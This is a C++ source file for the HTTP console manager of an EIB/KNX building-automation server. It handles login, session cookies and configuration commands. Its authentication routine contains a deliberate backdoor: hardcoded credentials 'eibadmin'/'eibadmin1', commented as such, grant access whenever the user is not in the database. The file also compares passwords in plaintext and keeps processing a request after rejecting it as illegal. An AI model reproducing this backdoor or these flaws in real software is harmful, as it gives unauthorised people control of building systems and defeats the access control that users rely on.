#include "ConsoleManager.h"
#include "EIBServer.h"

//conf includes
#include "conf/EIBServerUsersConf.h"
#include "conf/EIBInterfaceConf.h"
#include "conf/EIBBusMonConf.h"

CConsoleManager::CConsoleManager() : 
_initialized(false),
_stop(false),
_sock(NULL)
{
}

CConsoleManager::~CConsoleManager()
{
	if(_sock != NULL){
		delete _sock;
		_sock = NULL;
	}
}

void CConsoleManager::Init(int port)
{
	if(!_initialized || _sock == NULL){
		this->setName("Console Manager");
		_sock = new TCPServerSocket(port,1);
		_initialized = true;
		LOG_INFO("Console manager listening on port [%d]",port);
	}
}

void CConsoleManager::Close()
{
	JTCSynchronized sync(*this);
	_stop = true;
	this->notify();
}

#define HTTP_REQUEST_BUFF_SIZE 5 * 1024
void CConsoleManager::run()
{
	JTCSynchronized sync(*this);

	CHttpRequest request;
	CHttpReply reply;
	CDataBuffer raw_reply;

	
	char buf[HTTP_REQUEST_BUFF_SIZE];

	while (!_stop)
	{
		TCPSocket* sock = NULL;

		START_TRY
			reply.RemoveAllHeaders();	
			sock = _sock->Accept(2000);

			if (sock == NULL){
				this->wait(100);
				continue;
			}

			int len = sock->Recv(buf,HTTP_REQUEST_BUFF_SIZE,INFINITE);
			
			if (len == 0){
				buf[0] = '\0';
				continue;
			}

			request.RemoveAllHeaders();
			request.RemoveAllParams();
			CHttpParser parser(request,buf,len,*sock);
			
			//check that is legal http request
			if(!(parser.IsLegalRequest())){
				reply.GetContent().Clear();
				SetReplyAndSend(STATUS_NOT_FOUND,HTTP_1_0,reply,raw_reply,sock);
			}

			LOG_DEBUG("[Console Manager] Request Received: %s",request.GetRequestURI().GetBuffer());
			//if first login - then request must be authentication request
			if(IsAuthenticationRequest(request))
			{
				CString user_name,session_id;
				if(RequestAuthenticated(request,user_name)){
					_session_mgr.GenerateNewSession(user_name,session_id);
					GenerateSessionCookie(reply,session_id);
					reply.GetContent().Clear();
					reply.GetContent().Add(EIB_CLIENT_AUTHENTICATE_SUCCESS);
					SetReplyAndSend(STATUS_OK,HTTP_1_0,reply,raw_reply,sock);
					continue;
				}
				else{
					reply.GetContent().Clear();
					SetReplyAndSend(STATUS_FORBIDDEN,HTTP_1_0,reply,raw_reply,sock);
					continue;
				}
			}
			//if not first login - find session id
			if(!IsLegalSession(request)){
				LOG_ERROR("[Console Manager] Illegal Session Received. Send 403 Forbidden");
				reply.GetContent().Clear();
				SetReplyAndSend(STATUS_FORBIDDEN,HTTP_1_0,reply,raw_reply,sock);
				continue;
			}

			if(IsLegalDisconnectRequest(request)){
				if(IsLegalSession(request)){
					CHttpCookie cookie;
					request.GetCookie(EIB_SESSION_ID_COOKIE_NAME,cookie);
					_session_mgr.RemoveSession(cookie.GetValue());
				}
				reply.GetContent().Clear();
				reply.GetContent().Add(EIB_CLIENT_AUTHENTICATE_SUCCESS);
				SetReplyAndSend(STATUS_OK,HTTP_1_0,reply,raw_reply,sock);
				continue;
			}

			CONSOLE_API_REQUEST type = ParseRequestLine(request.GetRequestURI());
			HandleRequest(*sock,request,type,reply,raw_reply);

			sock->Close();

			if(sock != NULL){
				delete sock;
				sock = NULL;
			}

		END_TRY_START_CATCH(e)
			LOG_ERROR("Console Manager exception: %s",e.what());
			if(sock != NULL){
				sock->Close();
				delete sock;
				sock = NULL;
			}
		END_TRY_START_CATCH_SOCKET(e)
			LOG_ERROR("Console Manager exception: %s",e.what());
		END_TRY_START_CATCH_ANY
			LOG_ERROR("Console Manager Unknown exception");
		END_CATCH
	}

	_sock->Close();
}

void CConsoleManager::SetReplyAndSend(HTTP_STATUS_CODE sc, HTTP_VERSION version, CHttpReply& reply,CDataBuffer& buf, TCPSocket* socket)
{
	reply.SetStatusCode(sc);
	reply.SetVersion(version);
	reply.Finalize(buf);
	socket->Send(buf.GetBuffer(),buf.GetLength());
}

bool CConsoleManager::RequestAuthenticated(const CHttpRequest& request,CString& uname)
{
	CHttpHeader user_name;
	CHttpHeader password;
	if(!request.GetHeader(USER_NAME_HEADER,user_name) || !request.GetHeader(PASSWORD_HEADER,password)){
		return false;
	}
	CUser user;
	if(!CEIBServer::GetInstance().GetUsersDB().GetRecord(user_name.GetValue(),user)){
		//YGYG - Back door for admin password
		if(user_name.GetValue() == "eibadmin" && password.GetValue() == "eibadmin1"){
			return true;
		}
		return false;
	}
	if(!(user.GetPassword() == password.GetValue())){
		//password mismatch
		LOG_INFO("[Console Manager] Connection attempt with password mismatch. User %s", uname.GetBuffer());
		return false;
	}

	if(!user.IsConsoleAccessAllowed()){
		//user does not have permission to access via EIBConsole
		LOG_INFO("[Console Manager] Connection attempt with insufficient privileges. User %s", uname.GetBuffer());
		return false;
	}

	uname = user_name.GetValue();
	return true;
}

bool CConsoleManager::IsLegalSession(const CHttpRequest& request)
{
	CHttpCookie cookie;
	if(request.GetCookie(EIB_SESSION_ID_COOKIE_NAME,cookie)){
		if(!_session_mgr.FindSession(cookie.GetValue())){
			return false;
		}
		return true;
	}
	return false;
}

bool CConsoleManager::IsAuthenticationRequest(const CHttpRequest& request)
{
	CString tmp;
	if (request.GetRequestURI()[0] == '/'){
		tmp = request.GetRequestURI().SubString(1,request.GetRequestURI().GetLength() - 1);
	}
	else{
		tmp = request.GetRequestURI();
	}
	if(tmp == EIB_CLIENT_AUTHENTICATE){
		return true;
	}
	return false;
}

bool CConsoleManager::IsLegalDisconnectRequest(const CHttpRequest& request)
{
	CString tmp;
	if (request.GetRequestURI()[0] == '/'){
		tmp = request.GetRequestURI().SubString(1,request.GetRequestURI().GetLength() - 1);
	}
	else{
		tmp = request.GetRequestURI();
	}
	if(tmp == EIB_CLIENT_DISCONNECT){
		return true;
	}
	return false;
}

CONSOLE_API_REQUEST CConsoleManager::ParseRequestLine(const CString& request_uri)
{
	CString tmp;
	if (request_uri[0] == '/'){
		tmp = request_uri.SubString(1,request_uri.GetLength() - 1);
	}
	else{
		tmp = request_uri;
	}

	//users list
	if(tmp == EIB_SERVER_GET_USERS_CONF_CMD){
		return GetConfUsersList;
	}
	else if(tmp == EIB_SERVER_SET_USERS_CONF_CMD){
		return SetConfUsersList;
	}
	//EIB interface conf
	else if(tmp == EIB_SERVER_GET_INTERFACE_CONF_CMD){
		return GetConfEIBInterface;
	}
	else if(tmp == EIB_SERVER_SET_INTERFACE_CONF_CMD){
		return SetConfEIBInterface;
	}
	else if(tmp == EIB_CONSOLE_KEEP_ALIVE_CMD){
		return GetKeepAliveStatus;
	}
	else if(tmp == EIB_SERVER_INTERFACE_STOP_CMD){
		return GetEIBInterfaceStop;
	}
	else if(tmp == EIB_SERVER_INTERFACE_START_CMD){
		return GetEIBInterfaceStart;
	}
	else if(tmp == EIB_BUS_MON_GET_ADDRESSES_CMD){
		return GetAddressList;
	}
	else if (tmp == EIB_BUS_MON_SEND_CMD_TO_ADDR_CMD){
		return SendAddrCommand;
	}
	return UNDEF_REQUEST;
}

void CConsoleManager::HandleRequest(TCPSocket& socket,const CHttpRequest& request,CONSOLE_API_REQUEST type,CHttpReply& reply,CDataBuffer& buffer)
{
	buffer.SetLength(0);
	reply.Reset();
	
	switch(type)
	{
	//interface config
	case GetConfEIBInterface: GetEIBInterfaceConf(request,reply);
		break;
	case SetConfEIBInterface: SetEIBInterfaceConf(request,reply);
		break;
	case GetConfUsersList: GetUsersList(request,reply);
		break;
	case SetConfUsersList: SetUsersList(request,reply);
		break;
	case GetKeepAliveStatus: GetKeepAlive(request,reply);
		break;
	case GetEIBInterfaceStop: StopEIBInterface(request,reply);
		break;
	case GetEIBInterfaceStart: StartEIBInterface(request,reply);
		break;
	case GetAddressList: GetEibAddressList(request,reply);
		break;
	case SendAddrCommand: SendCommandToAddress(request, reply);
		break;
	case UNDEF_REQUEST:
		break;
	}

	CString new_session;
	CHttpCookie c;
	request.GetCookie(EIB_SESSION_ID_COOKIE_NAME,c);
	_session_mgr.RegenerateSessionID(c.GetValue(),new_session);
    GenerateSessionCookie(reply,new_session);
	reply.Finalize(buffer);
	socket.Send(buffer.GetBuffer(),buffer.GetLength());
}

void CConsoleManager::GenerateSessionCookie(CHttpReply& reply,const CString& session_id)
{
	CHttpCookie cookie;
	cookie.SetName(EIB_SESSION_ID_COOKIE_NAME);
	cookie.SetValue(session_id);
	cookie.SetPath("/");
	reply.AddCookie(cookie);
}

void CConsoleManager::GetUsersList(const CHttpRequest& request, CHttpReply& reply)
{
	CEIBServerUsersConf conf;
	conf.GetConnectedClients();

	reply.SetStatusCode(STATUS_OK);
	reply.SetVersion(HTTP_1_0);

	reply.GetContent().Clear();
	conf.ToXml(reply.GetContent());
}

void CConsoleManager::SetUsersList(const CHttpRequest& request, CHttpReply& reply)
{
	CEIBServerUsersConf conf;
	conf.FromXml(request.GetContent());
	conf.SetConnectedClients();

	reply.SetStatusCode(STATUS_OK);
	reply.SetVersion(HTTP_1_0);
	reply.GetContent().Clear();
}

void CConsoleManager::GetEIBInterfaceConf(const CHttpRequest& request, CHttpReply& reply)
{
	CEIBInterfaceConf conf;
	reply.SetStatusCode(STATUS_OK);
	reply.SetVersion(HTTP_1_0);

	reply.GetContent().Clear();
	conf.ToXml(reply.GetContent());
}

void CConsoleManager::SetEIBInterfaceConf(const CHttpRequest& request, CHttpReply& reply)
{
}

void CConsoleManager::GetKeepAlive(const CHttpRequest& request, CHttpReply& reply)
{
	reply.SetStatusCode(STATUS_OK);
	reply.SetVersion(HTTP_1_0);
	reply.GetContent().Clear();
	reply.GetContent().Add("OK");
}

void CConsoleManager::StopEIBInterface(const CHttpRequest& request, CHttpReply& reply)
{
	CEIBInterfaceConf conf;
	
	reply.SetStatusCode(STATUS_OK);
	reply.SetVersion(HTTP_1_0);
	reply.GetContent().Clear();
	
	conf.StopInterface(reply.GetContent());
}

void CConsoleManager::StartEIBInterface(const CHttpRequest& request, CHttpReply& reply)
{
	CEIBInterfaceConf conf;

	reply.SetStatusCode(STATUS_OK);
	reply.SetVersion(HTTP_1_0);
	reply.GetContent().Clear();
	
	conf.StartInterface(reply.GetContent());
}

void CConsoleManager::GetEibAddressList(const CHttpRequest& request, CHttpReply& reply)
{
	reply.SetStatusCode(STATUS_OK);
	reply.SetVersion(HTTP_1_0);
	CEIBBusMonAddrListConf conf;

	reply.GetContent().Clear();
	conf.ToXml(reply.GetContent());
}

void CConsoleManager::SendCommandToAddress(const CHttpRequest& request, CHttpReply& reply)
{
	reply.SetStatusCode(STATUS_OK);
	reply.SetVersion(HTTP_1_0);
	CEIBBusMonAddrListConf conf;
	conf.SendCmdToAddr(request);
}

////////////////////////////////////////////////////////////////////////////////////////
